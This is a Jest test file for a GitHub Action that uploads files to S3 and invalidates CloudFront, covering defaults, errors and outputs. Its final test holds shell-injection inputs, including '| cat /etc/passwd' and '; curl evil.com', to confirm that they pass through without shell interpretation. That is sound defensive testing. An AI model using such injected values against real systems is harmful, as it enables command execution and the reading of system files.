import * as core from "@actions/core";
import { execFileSync } from "child_process";
import * as fs from "fs";
import { run } from "../src/index";

jest.mock("child_process", () => ({
  execFileSync: jest.fn(),
}));

jest.mock("@actions/core");

describe("S3 Deploy GitHub Action", () => {
  const execFileSyncMock = jest.mocked(execFileSync);
  const setFailedMock = jest.mocked(core.setFailed);
  const getInputMock = jest.mocked(core.getInput);
  const getBooleanInputMock = jest.mocked(core.getBooleanInput);
  const setOutputMock = jest.mocked(core.setOutput);
  const errorMock = jest.mocked(core.error);
  const existsSyncMock = jest.spyOn(fs, "existsSync");

  const defaultInputs: Record<string, string> = {
    AWS_ACCESS_KEY_ID: "test-access-key",
    AWS_SECRET_ACCESS_KEY: "test-secret-key",
    AWS_S3_BUCKET: "test-bucket",
    SOURCE_DIR: "test-source-dir",
    AWS_REGION: "us-east-1",
    CLOUDFRONT_DISTRIBUTION_ID: "test-distribution-id",
    AWS_S3_PREFIX: "test-prefix",
    AWS_S3_ENDPOINT: "test-endpoint",
    AWS_S3_ACL: "public-read",
  };

  let inputs: Record<string, string>;

  beforeEach(() => {
    jest.clearAllMocks();
    inputs = { ...defaultInputs };

    delete process.env.AWS_ACCESS_KEY_ID;
    delete process.env.AWS_SECRET_ACCESS_KEY;
    delete process.env.AWS_DEFAULT_REGION;
    delete process.env.AWS_S3_ENDPOINT;

    existsSyncMock.mockReturnValue(true);
    getInputMock.mockImplementation((name: string) => inputs[name] || "");
    getBooleanInputMock.mockReturnValue(false);
    execFileSyncMock.mockImplementation(
      (_file: string, args?: readonly string[]) => {
        if (args?.[0] === "cloudfront") {
          return '{"Invalidation":{"Id":"INVALIDATION123"}}';
        }
        return Buffer.from("");
      }
    );
  });

  it("syncs files, sets credentials, and publishes outputs", async () => {
    await run();

    expect(process.env.AWS_ACCESS_KEY_ID).toBe("test-access-key");
    expect(process.env.AWS_SECRET_ACCESS_KEY).toBe("test-secret-key");
    expect(process.env.AWS_DEFAULT_REGION).toBe("us-east-1");
    expect(process.env.AWS_S3_ENDPOINT).toBe("test-endpoint");

    expect(execFileSyncMock).toHaveBeenNthCalledWith(
      1,
      "aws",
      [
        "s3",
        "sync",
        "test-source-dir",
        "s3://test-bucket/test-prefix",
        "--no-progress",
        "--acl",
        "public-read",
        "--endpoint-url",
        "test-endpoint",
      ],
      { shell: false, stdio: "inherit" }
    );
    expect(execFileSyncMock).toHaveBeenNthCalledWith(
      2,
      "aws",
      [
        "cloudfront",
        "create-invalidation",
        "--distribution-id",
        "test-distribution-id",
        "--paths",
        "/*",
      ],
      { encoding: "utf-8", shell: false, stdio: "pipe" }
    );
    expect(setOutputMock).toHaveBeenCalledWith(
      "s3_url",
      "s3://test-bucket/test-prefix"
    );
    expect(setOutputMock).toHaveBeenCalledWith(
      "cloudfront_invalidation_id",
      "INVALIDATION123"
    );
  });

  it("uses defaults and omits optional arguments", async () => {
    inputs = {
      AWS_ACCESS_KEY_ID: "access",
      AWS_SECRET_ACCESS_KEY: "secret",
      AWS_S3_BUCKET: "bucket",
      SOURCE_DIR: "",
      AWS_REGION: "",
      CLOUDFRONT_DISTRIBUTION_ID: "",
      AWS_S3_PREFIX: "",
      AWS_S3_ENDPOINT: "",
      AWS_S3_ACL: "",
    };

    await run();

    expect(execFileSyncMock).toHaveBeenCalledWith(
      "aws",
      ["s3", "sync", ".", "s3://bucket", "--no-progress"],
      { shell: false, stdio: "inherit" }
    );
    expect(execFileSyncMock).not.toHaveBeenCalledWith(
      "aws",
      expect.arrayContaining(["cloudfront"]),
      expect.anything()
    );
    expect(process.env.AWS_DEFAULT_REGION).toBe("us-east-1");
    expect(process.env.AWS_S3_ENDPOINT).toBeUndefined();
    expect(setOutputMock).toHaveBeenCalledWith("s3_url", "s3://bucket");
  });

  it("adds --delete when DELETE_REMOVED is true", async () => {
    getBooleanInputMock.mockReturnValue(true);

    await run();

    expect(execFileSyncMock).toHaveBeenCalledWith(
      "aws",
      expect.arrayContaining(["--delete"]),
      expect.objectContaining({ shell: false })
    );
  });

  it("removes a stale endpoint environment variable when no endpoint is supplied", async () => {
    process.env.AWS_S3_ENDPOINT = "stale-endpoint";
    inputs.AWS_S3_ENDPOINT = "";

    await run();

    expect(process.env.AWS_S3_ENDPOINT).toBeUndefined();
  });

  it("fails before invoking AWS when the source directory does not exist", async () => {
    existsSyncMock.mockReturnValue(false);
    inputs.SOURCE_DIR = "missing-directory";

    await run();

    expect(execFileSyncMock).not.toHaveBeenCalled();
    expect(setFailedMock).toHaveBeenCalledWith(
      "Action failed with error: Error: Source directory does not exist: missing-directory"
    );
  });

  it("fails when a required input is missing", async () => {
    getInputMock.mockImplementation((name: string, options?: core.InputOptions) => {
      if (options?.required && name === "AWS_S3_BUCKET") {
        throw new Error("Input required and not supplied: AWS_S3_BUCKET");
      }
      return inputs[name] || "";
    });

    await run();

    expect(setFailedMock).toHaveBeenCalledWith(
      "Action failed with error: Error: Input required and not supplied: AWS_S3_BUCKET"
    );
  });

  it("fails when DELETE_REMOVED is not a valid boolean", async () => {
    getBooleanInputMock.mockImplementation(() => {
      throw new Error("Invalid boolean value");
    });

    await run();

    expect(setFailedMock).toHaveBeenCalledWith(
      "Action failed with error: Error: Invalid boolean value"
    );
  });

  it("reports S3 failures and does not set outputs", async () => {
    const error = new Error("S3 sync failed");
    execFileSyncMock.mockImplementationOnce(() => {
      throw error;
    });

    await run();

    expect(setFailedMock).toHaveBeenCalledWith(
      "Action failed with error: Error: S3 sync failed"
    );
    expect(errorMock).toHaveBeenCalledWith("Error syncing files to S3");
    expect(setOutputMock).not.toHaveBeenCalled();
  });

  it("reports CloudFront failures after a successful S3 sync", async () => {
    const error = new Error("CloudFront invalidation failed");
    execFileSyncMock
      .mockImplementationOnce(() => Buffer.from(""))
      .mockImplementationOnce(() => {
        throw error;
      });

    await run();

    expect(setOutputMock).toHaveBeenCalledWith(
      "s3_url",
      "s3://test-bucket/test-prefix"
    );
    expect(setFailedMock).toHaveBeenCalledWith(
      "Action failed with error: Error: CloudFront invalidation failed"
    );
    expect(errorMock).toHaveBeenCalledWith(
      "Error invalidating CloudFront cache"
    );
  });

  it("does not publish an invalidation output when AWS returns no ID", async () => {
    execFileSyncMock.mockImplementation((file, args) => {
      if (args?.[0] === "cloudfront") {
        return '{"Invalidation":{}}';
      }
      return Buffer.from("");
    });

    await run();

    expect(setFailedMock).not.toHaveBeenCalled();
    expect(setOutputMock).not.toHaveBeenCalledWith(
      "cloudfront_invalidation_id",
      expect.anything()
    );
  });

  it("passes input values as literal argv values without shell interpretation", async () => {
    const maliciousSource = "$(whoami); echo pwned";
    const maliciousPrefix = "prefix; echo pwned";
    const maliciousAcl = "public-read && echo pwned";
    const maliciousEndpoint = "https://s3.example.com | cat /etc/passwd";

    inputs.SOURCE_DIR = maliciousSource;
    inputs.AWS_S3_PREFIX = maliciousPrefix;
    inputs.AWS_S3_ACL = maliciousAcl;
    inputs.AWS_S3_ENDPOINT = maliciousEndpoint;
    inputs.CLOUDFRONT_DISTRIBUTION_ID = "E123ABC; curl evil.com";

    await run();

    expect(execFileSyncMock).toHaveBeenNthCalledWith(
      1,
      "aws",
      [
        "s3",
        "sync",
        maliciousSource,
        `s3://test-bucket/${maliciousPrefix}`,
        "--no-progress",
        "--acl",
        maliciousAcl,
        "--endpoint-url",
        maliciousEndpoint,
      ],
      { shell: false, stdio: "inherit" }
    );
    expect(execFileSyncMock).toHaveBeenNthCalledWith(
      2,
      "aws",
      [
        "cloudfront",
        "create-invalidation",
        "--distribution-id",
        "E123ABC; curl evil.com",
        "--paths",
        "/*",
      ],
      { encoding: "utf-8", shell: false, stdio: "pipe" }
    );
  });
});
